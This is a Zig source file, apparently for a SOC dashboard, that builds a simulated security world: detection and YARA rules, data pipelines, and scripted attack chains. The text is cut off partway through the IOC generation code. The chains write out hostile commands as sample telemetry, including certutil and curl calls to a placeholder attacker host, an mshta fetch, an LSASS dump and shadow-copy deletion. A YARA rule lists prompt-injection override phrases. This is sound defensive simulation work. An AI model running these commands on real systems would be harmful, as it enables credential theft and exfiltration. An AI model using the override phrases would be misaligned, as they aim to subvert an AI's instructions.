//! Deterministic mock-world generator: same seed + base timestamp ⇒
//! byte-identical world. Builds 26 h of telemetry with a diurnal rate
//! curve plus scripted incident chains (phish → macro → PowerShell → C2
//! beacon → cred dump → discovery → lateral movement → exfil), derives
//! alerts by "firing" detection rules against matching events, and links
//! alert clusters into cases — so Timeline, Process Tree and the Alert
//! Queue tell coherent stories. `tick()` trickles fresh events so the UI
//! looks alive.

const std = @import("std");
const domain = @import("domain");
const attack = domain.attack;
const store_mod = @import("store.zig");
const Store = store_mod.Store;

// ── Name pools (flavor only — indices drive determinism) ────────────────

const host_pool = [_][]const u8{
    "WS-ACCT-03",  "WS-ACCT-07",  "WS-ENG-11",  "WS-ENG-14",   "WS-ENG-21",
    "WS-HR-02",    "WS-FIN-05",   "WS-FIN-09",  "WS-EXEC-01",  "WS-IT-04",
    "WS-SALES-12", "WS-SALES-18", "WS-MKT-06",  "WS-LEGAL-01", "WS-OPS-08",
    "WS-DEV-15",   "SRV-DC-01",   "SRV-DC-02",  "SRV-FILE-01", "SRV-WEB-01",
    "SRV-SQL-01",  "SRV-EXCH-01", "SRV-BKP-01", "SRV-VPN-01",
};

const user_pool = [_][]const u8{
    "j.smith",   "a.garcia", "m.chen",    "s.patel",   "k.novak",  "t.okafor",
    "l.johnson", "r.kim",    "d.freeman", "e.watts",   "svc-backup", "svc-web",
};

const analyst_pool = [_][]const u8{ "cpresley", "nblake", "rvance", "" };

const benign_procs = [_][]const u8{
    "chrome.exe",   "outlook.exe", "excel.exe",  "winword.exe", "teams.exe",
    "svchost.exe",  "explorer.exe", "code.exe",  "slack.exe",   "onedrive.exe",
};

const dns_domains = [_][]const u8{
    "cdn.office365.com", "update.googleapis.com", "api.slack.com",
    "github.com",        "crl.microsoft.com",     "telemetry.mozilla.org",
};

const evil_domains = [_][]const u8{
    "cdn-metrics-sync.net", "win-svc-update.org", "cloud-report-api.com",
    "mx1-relay-eu.net",     "static-asset-hub.io",
};

const feed_names = [_][]const u8{
    "AbuseCH ThreatFox", "AlienVault OTX", "CISA AIS", "Internal Blocklist",
    "Emerging Threats",  "VirusTotal Hunting",
};

const actor_defs = [_]struct {
    name: []const u8,
    aliases: []const u8,
    motivation: domain.Motivation,
    notes: []const u8,
}{
    .{ .name = "MIDNIGHT MANTIS", .aliases = "TA-4471, BronzeVine", .motivation = .espionage, .notes = "Targets engineering + legal. Spearphish with ISO lures, DLL side-loading, long-dwell C2 over HTTPS. Watch for rundll32 spawning from user-writable paths." },
    .{ .name = "GILDED SPIDER", .aliases = "FIN-88, CarbonWasp", .motivation = .financial, .notes = "Ransomware affiliate. Initial access via exposed RDP + password spraying; rapid encryption within 6h of first beacon. Kills VSS + backup services first." },
    .{ .name = "CINDER WOLF", .aliases = "APT-C-55", .motivation = .destruction, .notes = "Wiper operations disguised as ransomware. Heavy scheduled-task persistence and event-log clearing." },
    .{ .name = "HOLLOW SIGNAL", .aliases = "TA-2210, GreyMinnow", .motivation = .financial, .notes = "BEC + mailbox rules. Loves OAuth consent phishing and remote email collection; almost never touches endpoints." },
    .{ .name = "QUARTZ VEIL", .aliases = "APT-Q, SilentTerrace", .motivation = .espionage, .notes = "Living-off-the-land only: WMI, WinRM, PowerShell without amsi bypass. Exfil to cloud storage in <10 MB chunks." },
};

/// Detection rule blueprints: name + technique (by string id) + severity +
/// pseudo-KQL. Noise factor drives fires/FP volumes.
const rule_defs = [_]struct {
    name: []const u8,
    tid: []const u8,
    sev: domain.Severity,
    query: []const u8,
    noisy: bool = false,
}{
    .{ .name = "PowerShell EncodedCommand", .tid = "T1059.001", .sev = .high, .query = "proc where name == 'powershell.exe' and cmdline has '-enc'" },
    .{ .name = "Office spawning shell", .tid = "T1059.003", .sev = .high, .query = "proc where parent in ('winword.exe','excel.exe') and name in ('cmd.exe','powershell.exe')" },
    .{ .name = "Macro doc launched", .tid = "T1204.002", .sev = .medium, .query = "file where ext == '.docm' and action == 'open'", .noisy = true },
    .{ .name = "Phishing attachment executed", .tid = "T1566.001", .sev = .high, .query = "proc where parent == 'outlook.exe' and name not in (allowlist)" },
    .{ .name = "Suspicious link click-through", .tid = "T1566.002", .sev = .medium, .query = "net where referrer == 'mail' and domain.age < 30d", .noisy = true },
    .{ .name = "Rundll32 no-args launch", .tid = "T1218.011", .sev = .high, .query = "proc where name == 'rundll32.exe' and cmdline.args == 0" },
    .{ .name = "Mshta remote script", .tid = "T1218.005", .sev = .high, .query = "proc where name == 'mshta.exe' and cmdline has 'http'" },
    .{ .name = "LSASS memory read", .tid = "T1003.001", .sev = .critical, .query = "proc where target == 'lsass.exe' and access has 'PROCESS_VM_READ'" },
    .{ .name = "Password spray pattern", .tid = "T1110.003", .sev = .high, .query = "auth where fails > 20 by src over 5m and distinct(user) > 10" },
    .{ .name = "Kerberoast ticket burst", .tid = "T1558.003", .sev = .high, .query = "auth where ticket == 'TGS' and enc == 'RC4' and count > 8 over 2m" },
    .{ .name = "Browser cred store access", .tid = "T1555.003", .sev = .medium, .query = "file where path has 'Login Data' and proc != browser", .noisy = true },
    .{ .name = "Run key persistence", .tid = "T1547.001", .sev = .medium, .query = "reg where key has 'CurrentVersion\\\\Run' and action == 'set'" },
    .{ .name = "New service install", .tid = "T1543.003", .sev = .medium, .query = "reg where key has 'Services' and action == 'create'", .noisy = true },
    .{ .name = "Local account created", .tid = "T1136.001", .sev = .high, .query = "proc where name == 'net.exe' and cmdline has 'user /add'" },
    .{ .name = "DLL side-load from temp", .tid = "T1574.002", .sev = .high, .query = "image where signed == false and path has 'AppData'" },
    .{ .name = "Web shell write", .tid = "T1505.003", .sev = .critical, .query = "file where path has 'wwwroot' and ext in ('.aspx','.jsp')" },
    .{ .name = "UAC bypass fodhelper", .tid = "T1548.002", .sev = .high, .query = "reg where key has 'ms-settings' and proc == 'fodhelper.exe'" },
    .{ .name = "Process injection CreateRemoteThread", .tid = "T1055", .sev = .critical, .query = "proc where api == 'CreateRemoteThread' and target != self" },
    .{ .name = "Token manipulation", .tid = "T1134", .sev = .high, .query = "proc where api == 'SetThreadToken' and integrity < high" },
    .{ .name = "Event log cleared", .tid = "T1070.001", .sev = .critical, .query = "log where action == 'clear' and channel == 'Security'" },
    .{ .name = "Mass file delete", .tid = "T1070.004", .sev = .medium, .query = "file where action == 'delete' and count > 200 over 1m", .noisy = true },
    .{ .name = "Obfuscated script block", .tid = "T1027", .sev = .medium, .query = "script where entropy > 5.5 and len > 2048", .noisy = true },
    .{ .name = "Defender tamper attempt", .tid = "T1562.001", .sev = .critical, .query = "reg where key has 'DisableRealtimeMonitoring'" },
    .{ .name = "Registry policy tamper", .tid = "T1112", .sev = .medium, .query = "reg where key has 'Policies' and proc not in (gpo)" },
    .{ .name = "Domain account enum", .tid = "T1087.002", .sev = .medium, .query = "proc where name == 'net.exe' and cmdline has 'group \"Domain Admins\"'" },
    .{ .name = "Remote system discovery", .tid = "T1018", .sev = .low, .query = "proc where name in ('nltest.exe','ping.exe') and count > 15 over 5m", .noisy = true },
    .{ .name = "Port scan from host", .tid = "T1046", .sev = .medium, .query = "net where distinct(dst_port) > 50 by src over 1m" },
    .{ .name = "Process listing burst", .tid = "T1057", .sev = .low, .query = "proc where name == 'tasklist.exe' and count > 5 over 10m", .noisy = true },
    .{ .name = "System info recon", .tid = "T1082", .sev = .low, .query = "proc where name == 'systeminfo.exe'", .noisy = true },
    .{ .name = "RDP to server segment", .tid = "T1021.001", .sev = .medium, .query = "net where dst_port == 3389 and src in (workstations) and dst in (servers)" },
    .{ .name = "Admin share mount", .tid = "T1021.002", .sev = .high, .query = "net where share in ('ADMIN$','C$') and user != admin" },
    .{ .name = "WinRM lateral session", .tid = "T1021.006", .sev = .high, .query = "net where dst_port == 5985 and proc == 'wsmprovhost.exe'" },
    .{ .name = "PsExec-style service", .tid = "T1570", .sev = .high, .query = "svc where name matches 'PSEXESVC|remcom'" },
    .{ .name = "Pass-the-hash logon", .tid = "T1550.002", .sev = .critical, .query = "auth where logon_type == 9 and ntlm == true" },
    .{ .name = "Archive staging", .tid = "T1560.001", .sev = .medium, .query = "proc where name in ('7z.exe','rar.exe') and size > 100MB" },
    .{ .name = "Screen capture util", .tid = "T1113", .sev = .low, .query = "proc where api == 'BitBlt' and proc not in (allowlist)", .noisy = true },
    .{ .name = "Mailbox export request", .tid = "T1114.002", .sev = .high, .query = "cloud where op == 'New-MailboxExportRequest'" },
    .{ .name = "Beacon-like periodicity", .tid = "T1071.001", .sev = .high, .query = "net where jitter(dst) < 5% and interval ~ 60s and dur > 30m" },
    .{ .name = "DNS tunnel entropy", .tid = "T1071.004", .sev = .high, .query = "dns where subdomain.entropy > 4.2 and qcount > 100 over 10m" },
    .{ .name = "Rare external proxy chain", .tid = "T1090.003", .sev = .medium, .query = "net where dst in (tor_exit_nodes)" },
    .{ .name = "Certutil download", .tid = "T1105", .sev = .high, .query = "proc where name == 'certutil.exe' and cmdline has 'urlcache'" },
    .{ .name = "Exfil over C2", .tid = "T1041", .sev = .critical, .query = "net where bytes_out > 50MB to beacon_dst" },
    .{ .name = "Cloud storage upload burst", .tid = "T1567.002", .sev = .high, .query = "net where dst in (mega,dropbox,anonfiles) and bytes_out > 100MB" },
    .{ .name = "VSS deletion", .tid = "T1490", .sev = .critical, .query = "proc where name == 'vssadmin.exe' and cmdline has 'delete shadows'" },
    .{ .name = "Mass encryption pattern", .tid = "T1486", .sev = .critical, .query = "file where renames > 500 over 2m and ext.new not in (known)" },
    .{ .name = "Backup service stop", .tid = "T1489", .sev = .high, .query = "svc where action == 'stop' and name in (backup_services)" },
};

/// YARA rule blueprints (rules-as-code): each carries the mandatory
/// 7-field metadata plus a *scripted* CI gate story so the YAR panel tells
/// a coherent narrative — one meta failure, one TP miss, one FP offender,
/// one perf blowout, the rest green.
const yara_defs = [_]struct {
    name: []const u8,
    tid: []const u8,
    sev: domain.Severity,
    status: domain.YaraStatus = .active,
    description: []const u8,
    reference: []const u8,
    strings_excerpt: []const u8,
    condition: []const u8,
    meta_fail: bool = false, // reference field missing → metadata policy gate fails
    tp_fail: bool = false, // synthetic fixture no longer fires
    fp_count: u16 = 0, // goodware-corpus hits
    scan_ms: f32,
}{
    .{ .name = "PowerShell_EncodedCommand", .tid = "T1059.001", .sev = .high, .description = "Detects PowerShell invoked with an encoded (Base64) command payload", .reference = "https://attack.mitre.org/techniques/T1059/001/", .strings_excerpt = "$flag = /-e(nc|c)?\\s+[A-Za-z0-9+\\/]{40,}={0,2}/ nocase\n$ps = \"powershell\" nocase", .condition = "$ps and $flag", .scan_ms = 4.1 },
    .{ .name = "PowerShell_AMSI_Bypass", .tid = "T1562.001", .sev = .critical, .description = "Detects reflective AMSI bypass patterns in PowerShell/.NET", .reference = "https://attack.mitre.org/techniques/T1562/001/", .strings_excerpt = "$a1 = \"AmsiScanBuffer\" ascii wide\n$a2 = \"amsiInitFailed\" ascii wide\n$r = \"[Ref].Assembly.GetType\" nocase", .condition = "$r and any of ($a*)", .scan_ms = 5.6 },
    .{ .name = "Webshell_PHP_Eval_Base64", .tid = "T1505.003", .sev = .critical, .description = "PHP webshell: eval over a base64-decoded superglobal", .reference = "https://attack.mitre.org/techniques/T1505/003/", .strings_excerpt = "$php = \"<?php\"\n$sink = \"eval(\" nocase\n$dec = \"base64_decode(\" nocase\n$sg = /_(GET|POST|REQUEST)\\[/", .condition = "$php and $sink and $dec and $sg", .fp_count = 2, .scan_ms = 7.9 },
    .{ .name = "Phishing_Kit_CredHarvest_HTML", .tid = "T1566.002", .sev = .high, .description = "Credential-harvest page: password field + off-site POST + staged decoder", .reference = "https://attack.mitre.org/techniques/T1566/002/", .strings_excerpt = "$pw = \"type=\\\"password\\\"\" nocase\n$post = /action=\\\"https?:\\/\\/[^\\\"]{8,}\\\"/ nocase\n$b64 = \"atob(\" nocase", .condition = "$pw and $post and $b64", .meta_fail = true, .scan_ms = 6.3 },
    .{ .name = "LNK_ScriptHost_Dropper", .tid = "T1204.002", .sev = .high, .description = "Shortcut dropper: script-host launch with window-stealth flags", .reference = "https://attack.mitre.org/techniques/T1204/002/", .strings_excerpt = "$host = /(wscript|cscript|mshta|powershell)(\\.exe)?/ nocase\n$hide = /-w(indowstyle)?\\s+hidden/ nocase", .condition = "$host and $hide", .scan_ms = 3.4 },
    .{ .name = "Base64_Encoded_PE_Heuristic", .tid = "T1027", .sev = .medium, .description = "Base64-embedded PE: MZ header prefix or DOS-stub marker in encoded form", .reference = "https://attack.mitre.org/techniques/T1027/", .strings_excerpt = "$mz1 = \"TVqQAAMAAAAEAAAA\"\n$stub = \"VGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4\"", .condition = "any of them", .scan_ms = 86.0 },
    .{ .name = "LLM_Jailbreak_PromptInjection", .tid = "T1204.002", .sev = .low, .status = .draft, .description = "Prompt-injection payloads in untrusted text: override/role/exfil phrase banks", .reference = "https://attack.mitre.org/techniques/T1204/", .strings_excerpt = "$o1 = \"ignore previous instructions\" nocase\n$o2 = \"disregard your system prompt\" nocase\n$x1 = \"reveal your instructions\" nocase", .condition = "2 of them", .tp_fail = true, .scan_ms = 9.2 },
    .{ .name = "Ransomware_Note_Template", .tid = "T1486", .sev = .critical, .description = "Ransom-note skeleton: encryption claim + payment channel + deadline threat", .reference = "https://attack.mitre.org/techniques/T1486/", .strings_excerpt = "$enc = /files (have been|are) encrypted/ nocase\n$tor = /[a-z2-7]{56}\\.onion/\n$btc = /\\b(bitcoin|monero|btc|xmr)\\b/ nocase", .condition = "$enc and ($tor or $btc)", .scan_ms = 44.0 },
};

/// Ingest source blueprints (PIP panel): the databases/buckets/topics an
/// analyst can point a pipeline at. One degraded + one unreachable story.
const source_defs = [_]struct {
    name: []const u8,
    kind: domain.SourceKind,
    dsn: []const u8,
    tables: u16,
    state: domain.ConnState = .ok,
    latency_ms: f32,
}{
    .{ .name = "SOC PostgreSQL", .kind = .postgres, .dsn = "postgres://soc@db01:5432/threats", .tables = 14, .latency_ms = 2.4 },
    .{ .name = "EDR telemetry lake", .kind = .s3_bucket, .dsn = "s3://edr-telemetry/raw/", .tables = 96, .latency_ms = 88 },
    .{ .name = "Events bus", .kind = .kafka, .dsn = "kafka://broker01:9092", .tables = 12, .latency_ms = 6 },
    .{ .name = "Perimeter syslog", .kind = .syslog, .dsn = "udp://fw-perimeter-01:514", .tables = 4, .state = .degraded, .latency_ms = 130 },
    .{ .name = "MISP intel API", .kind = .rest_api, .dsn = "https://misp.internal/attributes", .tables = 22, .latency_ms = 210 },
    .{ .name = "Legacy case archive", .kind = .mssql, .dsn = "mssql://arch01:1433/soc_archive", .tables = 31, .state = .err, .latency_ms = 0 },
    .{ .name = "HR asset export", .kind = .csv_file, .dsn = "\\\\fs01\\exports\\assets.csv", .tables = 1, .latency_ms = 15 },
};

const PipeStepDef = struct {
    kind: domain.StepKind,
    model: []const u8,
    mat: domain.Materialization = .view,
};

const PipeTestDef = struct {
    kind: domain.DbtTestKind,
    target: []const u8,
    fail: u32 = 0, // failing rows; > 0 flips the test to FAIL
};

/// Pipeline blueprints (dbt-style ELT). Scripted stories: one
/// accepted_values failure feeding a PARTIAL run, one unreachable source
/// with stale freshness + failed runs, one paused mart, one manual draft.
const pipeline_defs = [_]struct {
    name: []const u8,
    source: u16, // index into source_defs
    sink: domain.SinkKind,
    target: []const u8,
    schedule_min: u16,
    status: domain.PipelineStatus = .active,
    owner: []const u8,
    steps: []const PipeStepDef,
    tests: []const PipeTestDef,
    /// Run-history depth; scale of rows per run.
    runs: u8 = 6,
    base_rows: u64 = 10_000,
    /// Story flags: newest run PARTIAL (test failures) / every run FAILED.
    partial_last: bool = false,
    runs_fail: bool = false,
}{
    .{
        .name = "edr_events_ingest",
        .source = 2,
        .sink = .postgres,
        .target = "soc.events",
        .schedule_min = 5,
        .owner = "cpresley",
        .steps = &.{
            .{ .kind = .staging, .model = "stg_edr_events" },
            .{ .kind = .dedup, .model = "int_events_deduped", .mat = .incremental },
        },
        .tests = &.{
            .{ .kind = .not_null, .target = "stg_edr_events.host" },
            .{ .kind = .unique, .target = "int_events_deduped.event_id" },
            .{ .kind = .freshness, .target = "stg_edr_events" },
        },
        .runs = 8,
        .base_rows = 120_000,
    },
    .{
        .name = "ioc_feed_merge",
        .source = 4,
        .sink = .postgres,
        .target = "soc.iocs",
        .schedule_min = 30,
        .owner = "nblake",
        .steps = &.{
            .{ .kind = .staging, .model = "stg_misp_iocs" },
            .{ .kind = .dedup, .model = "int_iocs_deduped", .mat = .table },
            .{ .kind = .enrich, .model = "int_iocs_scored", .mat = .incremental },
        },
        .tests = &.{
            .{ .kind = .not_null, .target = "stg_misp_iocs.value" },
            .{ .kind = .accepted_values, .target = "stg_misp_iocs.type", .fail = 12 },
            .{ .kind = .relationships, .target = "int_iocs_scored.feed_id" },
        },
        .base_rows = 8_000,
        .partial_last = true,
    },
    .{
        .name = "sensor_uptime_rollup",
        .source = 0,
        .sink = .clickhouse,
        .target = "metrics.sensor_uptime_daily",
        .schedule_min = 60,
        .owner = "rvance",
        .steps = &.{
            .{ .kind = .staging, .model = "stg_sensor_health" },
            .{ .kind = .aggregate, .model = "mart_sensor_uptime_daily", .mat = .table },
        },
        .tests = &.{
            .{ .kind = .not_null, .target = "mart_sensor_uptime_daily.sensor_id" },
            .{ .kind = .freshness, .target = "stg_sensor_health" },
        },
        .base_rows = 900,
    },
    .{
        .name = "case_archive_sync",
        .source = 5,
        .sink = .s3_parquet,
        .target = "s3://soc-archive/cases/",
        .schedule_min = 360,
        .status = .err,
        .owner = "cpresley",
        .steps = &.{
            .{ .kind = .staging, .model = "stg_archive_cases" },
            .{ .kind = .mask, .model = "int_cases_masked", .mat = .table },
        },
        .tests = &.{
            .{ .kind = .freshness, .target = "stg_archive_cases", .fail = 1 },
            .{ .kind = .not_null, .target = "int_cases_masked.case_id" },
        },
        .runs = 3,
        .base_rows = 2_400,
        .runs_fail = true,
    },
    .{
        .name = "alert_metrics_mart",
        .source = 0,
        .sink = .elasticsearch,
        .target = "soc-alert-metrics",
        .schedule_min = 120,
        .status = .paused,
        .owner = "nblake",
        .steps = &.{
            .{ .kind = .staging, .model = "stg_alerts" },
            .{ .kind = .mask, .model = "int_alerts_masked" },
            .{ .kind = .aggregate, .model = "mart_alert_daily", .mat = .incremental },
        },
        .tests = &.{
            .{ .kind = .not_null, .target = "mart_alert_daily.day" },
            .{ .kind = .unique, .target = "mart_alert_daily.day_rule" },
        },
        .runs = 4,
        .base_rows = 5_200,
    },
    .{
        .name = "phish_url_export",
        .source = 0,
        .sink = .kafka_topic,
        .target = "phish-urls",
        .schedule_min = 0, // manual
        .status = .draft,
        .owner = "rvance",
        .steps = &.{
            .{ .kind = .staging, .model = "stg_iocs" },
            .{ .kind = .filter, .model = "int_urls_flagged" },
        },
        .tests = &.{
            .{ .kind = .not_null, .target = "int_urls_flagged.url" },
        },
        .runs = 0,
        .base_rows = 300,
    },
};

/// One stage of a scripted incident chain.
const ChainStage = struct {
    kind: domain.EventKind,
    proc: []const u8,
    cmdline: []const u8,
    tid: []const u8, // attack technique string id
    sev: domain.Severity,
    /// Minutes after the previous stage.
    gap_min: u32,
    /// Network stages: beacon to an evil domain/ip.
    evil_net: bool = false,
};

const chain_phish_ransom = [_]ChainStage{
    .{ .kind = .process, .proc = "outlook.exe", .cmdline = "OUTLOOK.EXE /recycle", .tid = "T1566.001", .sev = .medium, .gap_min = 0 },
    .{ .kind = .process, .proc = "winword.exe", .cmdline = "WINWORD.EXE /n \"C:\\Users\\%u\\Downloads\\Invoice_Q3.docm\"", .tid = "T1204.002", .sev = .medium, .gap_min = 1 },
    .{ .kind = .script, .proc = "powershell.exe", .cmdline = "powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBP...", .tid = "T1059.001", .sev = .high, .gap_min = 2 },
    .{ .kind = .network, .proc = "powershell.exe", .cmdline = "beacon 443/tls", .tid = "T1071.001", .sev = .high, .gap_min = 4, .evil_net = true },
    .{ .kind = .process, .proc = "rundll32.exe", .cmdline = "rundll32.exe C:\\ProgramData\\sync.dll,Start", .tid = "T1218.011", .sev = .high, .gap_min = 22 },
    .{ .kind = .process, .proc = "procdump64.exe", .cmdline = "procdump64.exe -ma lsass.exe C:\\ProgramData\\ls.dmp", .tid = "T1003.001", .sev = .critical, .gap_min = 35 },
    .{ .kind = .process, .proc = "net.exe", .cmdline = "net group \"Domain Admins\" /domain", .tid = "T1087.002", .sev = .medium, .gap_min = 41 },
    .{ .kind = .network, .proc = "System", .cmdline = "SMB ADMIN$ mount", .tid = "T1021.002", .sev = .high, .gap_min = 58 },
    .{ .kind = .process, .proc = "vssadmin.exe", .cmdline = "vssadmin delete shadows /all /quiet", .tid = "T1490", .sev = .critical, .gap_min = 96 },
};

const chain_webshell = [_]ChainStage{
    .{ .kind = .network, .proc = "w3wp.exe", .cmdline = "POST /owa/auth/x.aspx", .tid = "T1190", .sev = .high, .gap_min = 0 },
    .{ .kind = .file, .proc = "w3wp.exe", .cmdline = "write C:\\inetpub\\wwwroot\\aspnet_client\\supp.aspx", .tid = "T1505.003", .sev = .critical, .gap_min = 1 },
    .{ .kind = .process, .proc = "cmd.exe", .cmdline = "cmd /c whoami & systeminfo", .tid = "T1082", .sev = .medium, .gap_min = 9 },
    .{ .kind = .process, .proc = "certutil.exe", .cmdline = "certutil -urlcache -split -f http://%evil%/t.zip", .tid = "T1105", .sev = .high, .gap_min = 15, .evil_net = true },
    .{ .kind = .network, .proc = "svchost.exe", .cmdline = "beacon 8443/tls", .tid = "T1071.001", .sev = .high, .gap_min = 20, .evil_net = true },
    .{ .kind = .network, .proc = "rclone.exe", .cmdline = "rclone copy D:\\shares remote:bk", .tid = "T1567.002", .sev = .critical, .gap_min = 170, .evil_net = true },
};

const chain_spray_lateral = [_]ChainStage{
    .{ .kind = .auth, .proc = "lsass.exe", .cmdline = "NTLM auth burst: 240 fails / 34 users", .tid = "T1110.003", .sev = .high, .gap_min = 0 },
    .{ .kind = .auth, .proc = "lsass.exe", .cmdline = "logon type 3 success svc-backup", .tid = "T1078", .sev = .medium, .gap_min = 12 },
    .{ .kind = .network, .proc = "mstsc.exe", .cmdline = "RDP 3389 -> SRV-FILE-01", .tid = "T1021.001", .sev = .medium, .gap_min = 25 },
    .{ .kind = .process, .proc = "wsmprovhost.exe", .cmdline = "WinRM Invoke-Command Get-ChildItem", .tid = "T1021.006", .sev = .high, .gap_min = 44 },
    .{ .kind = .process, .proc = "7z.exe", .cmdline = "7z a -pX c:\\temp\\fin.7z \\\\SRV-FILE-01\\finance", .tid = "T1560.001", .sev = .high, .gap_min = 71 },
    .{ .kind = .network, .proc = "curl.exe", .cmdline = "PUT https://%evil%/u/fin.7z", .tid = "T1048.003", .sev = .critical, .gap_min = 84, .evil_net = true },
};

const chain_lotl_espionage = [_]ChainStage{
    .{ .kind = .process, .proc = "mshta.exe", .cmdline = "mshta https://%evil%/r.hta", .tid = "T1218.005", .sev = .high, .gap_min = 0, .evil_net = true },
    .{ .kind = .script, .proc = "powershell.exe", .cmdline = "powershell IEX(New-Object Net.WebClient).DownloadString(...)", .tid = "T1059.001", .sev = .high, .gap_min = 3 },
    .{ .kind = .registry, .proc = "reg.exe", .cmdline = "reg add HKCU\\...\\CurrentVersion\\Run /v Updater", .tid = "T1547.001", .sev = .medium, .gap_min = 8 },
    .{ .kind = .process, .proc = "wmic.exe", .cmdline = "wmic /node:SRV-SQL-01 process call create", .tid = "T1047", .sev = .high, .gap_min = 33 },
    .{ .kind = .dns, .proc = "svchost.exe", .cmdline = "TXT queries x400 base32 subdomains", .tid = "T1071.004", .sev = .high, .gap_min = 45, .evil_net = true },
    .{ .kind = .network, .proc = "svchost.exe", .cmdline = "exfil 38MB over dns tunnel", .tid = "T1041", .sev = .critical, .gap_min = 150, .evil_net = true },
};

const chains = [_][]const ChainStage{
    &chain_phish_ransom,
    &chain_webshell,
    &chain_spray_lateral,
    &chain_lotl_espionage,
};

const chain_case_titles = [_][]const u8{
    "Ransomware precursor on WS — phish chain",
    "OWA web shell on SRV-WEB-01",
    "Password spray → lateral movement → exfil",
    "LotL espionage — DNS tunnel exfil",
};

// ── Generator ────────────────────────────────────────────────────────────

pub const WORLD_SPAN_MS: i64 = 26 * std.time.ms_per_hour;

pub const Generator = struct {
    prng: std.Random.DefaultPrng,
    seed: u64,
    /// Wall-clock "now" the world was built against; events span
    /// [base_ms - WORLD_SPAN_MS, base_ms].
    base_ms: i64,
    next_event_id: u64 = 1,
    next_alert_id: u32 = 1,
    /// tick() fractional event accumulator.
    tick_carry: f32 = 0,
    last_tick_ms: i64 = 0,

    pub fn init(seed: u64, base_ms: i64) Generator {
        return .{
            .prng = std.Random.DefaultPrng.init(seed),
            .seed = seed,
            .base_ms = base_ms,
            .last_tick_ms = base_ms,
        };
    }

    fn rand(self: *Generator) std.Random {
        return self.prng.random();
    }

    /// Technique index by string id; panics on a typo (comptime data bug).
    fn tidOf(id: []const u8) attack.TechniqueId {
        for (attack.techniques, 0..) |t, i| {
            if (std.mem.eql(u8, t.id, id)) return @intCast(i);
        }
        unreachable;
    }

    /// Build the whole world into `store` (cleared first).
    pub fn build(self: *Generator, store: *Store) !void {
        store.clear();
        const alloc = store.allocator;

        // Hosts + users.
        for (host_pool) |h| try store.hosts.append(alloc, domain.FixedStr(48).from(h));
        for (user_pool) |u| try store.users.append(alloc, domain.FixedStr(32).from(u));

        // Sensors: EDR fleet coverage + one of each infra kind.
        const sensor_defs = [_]struct { host: []const u8, kind: domain.SensorKind }{
            .{ .host = "edr-fleet-ws", .kind = .edr },
            .{ .host = "edr-fleet-srv", .kind = .edr },
            .{ .host = "fw-perimeter-01", .kind = .firewall },
            .{ .host = "fw-dc-01", .kind = .firewall },
            .{ .host = "ids-span-01", .kind = .ids },
            .{ .host = "dns-resolver-01", .kind = .dns },
            .{ .host = "proxy-egress-01", .kind = .proxy },
            .{ .host = "m365-audit", .kind = .cloud },
            .{ .host = "aws-cloudtrail", .kind = .cloud },
            .{ .host = "ids-dmz-01", .kind = .ids },
        };
        for (sensor_defs, 0..) |sd, i| {
            const r = self.rand();
            const status: domain.SensorStatus = if (i == 8) .degraded else if (i == 9) .down else .ok;
            try store.sensors.append(alloc, .{
                .id = @intCast(i),
                .host = domain.FixedStr(48).from(sd.host),
                .kind = sd.kind,
                .status = status,
                .eps = switch (sd.kind) {
                    .edr => 120 + r.float(f32) * 260,
                    .firewall => 800 + r.float(f32) * 900,
                    .ids => 300 + r.float(f32) * 300,
                    .dns => 450 + r.float(f32) * 200,
                    .proxy => 250 + r.float(f32) * 150,
                    .cloud => 30 + r.float(f32) * 40,
                },
                .lag_s = if (status == .down) 9999 else if (status == .degraded) 45 + r.float(f32) * 200 else r.float(f32) * 4,
                .last_seen_ms = if (status == .down) self.base_ms - 3 * std.time.ms_per_hour else self.base_ms - @as(i64, @intFromFloat(r.float(f32) * 8000)),
                .version = domain.FixedStr(16).fromFmt("7.{d}.{d}", .{ r.intRangeAtMost(u8, 0, 4), r.intRangeAtMost(u8, 0, 20) }),
            });
        }

        // Intel feeds.
        for (feed_names, 0..) |fname, i| {
            const r = self.rand();
            try store.feeds.append(alloc, .{
                .id = @intCast(i),
                .name = domain.FixedStr(48).from(fname),
                .url = domain.FixedStr(96).fromFmt("https://feeds.example.org/{d}/indicators", .{i}),
                .last_sync_ms = self.base_ms - @as(i64, r.intRangeAtMost(u32, 120_000, 26_000_000)),
                .status = if (i == 4) .err else .ok,
            });
        }

        // Rules: one per blueprint (46) minus a few disabled ones — spread
        // across tactics by construction.
        for (rule_defs, 0..) |rd, i| {
            const r = self.rand();
            const status: domain.RuleStatus = if (i % 11 == 10) .disabled else if (i % 7 == 6) .testing else .enabled;
            const fires: u32 = if (rd.noisy) r.intRangeAtMost(u32, 40, 220) else r.intRangeAtMost(u32, 0, 18);
            const fp: u32 = if (rd.noisy) fires * r.intRangeAtMost(u32, 40, 85) / 100 else fires * r.intRangeAtMost(u32, 0, 30) / 100;
            try store.rules.append(alloc, .{
                .id = @intCast(i),
                .code = domain.FixedStr(8).fromFmt("R-{d:0>4}", .{i + 1}),
                .name = domain.FixedStr(96).from(rd.name),
                .status = status,
                .severity = rd.sev,
                .technique = tidOf(rd.tid),
                .fires_7d = fires,
                .fp_7d = fp,
                .last_fire_ms = self.base_ms - @as(i64, r.intRangeAtMost(u32, 60_000, 90_000_000)),
                .author = domain.FixedStr(24).from(analyst_pool[i % 3]),
                .query = domain.FixedStr(240).from(rd.query),
            });
        }

        // IOCs (~600) attributed to feeds.
        const ioc_total: usize = 600;
        var ioc_i: usize = 0;
        while (ioc_i < ioc_total) : (ioc_i += 1) {
            const r = self.rand();
            const t: domain.IocType = @enumFromInt(r.intRangeAtMost(u8, 0, 4));
            const dom_prefixes = [_][]const u8{ "cdn-", "sync-", "api-", "mx-", "update-" };
            const dom_tlds = [_][]const u8{ "net", "org", "io", "top", "xyz" };
            const url_paths = [_][]const u8{ "dl/", "u/", "cb/", "t/" };
            const email_locals = [_][]const u8{ "billing", "invoice", "hr-notice", "it-desk" };
            const value: domain.FixedStr(128) = switch (t) {
                .ip => domain.FixedStr(128).fromFmt("{d}.{d}.{d}.{d}", .{ r.intRangeAtMost(u8, 1, 223), r.intRangeAtMost(u8, 0, 255), r.intRangeAtMost(u8, 0, 255), r.intRangeAtMost(u8, 1, 254) }),
                .domain => domain.FixedStr(128).fromFmt("{s}{d}.{s}", .{ dom_prefixes[r.intRangeAtMost(usize, 0, dom_prefixes.len - 1)], r.intRangeAtMost(u16, 10, 9999), dom_tlds[r.intRangeAtMost(usize, 0, dom_tlds.len - 1)] }),
                .hash_sha256 => blk: {
                    var h: domain.FixedStr(128) = .{};
                    var j: usize = 0;
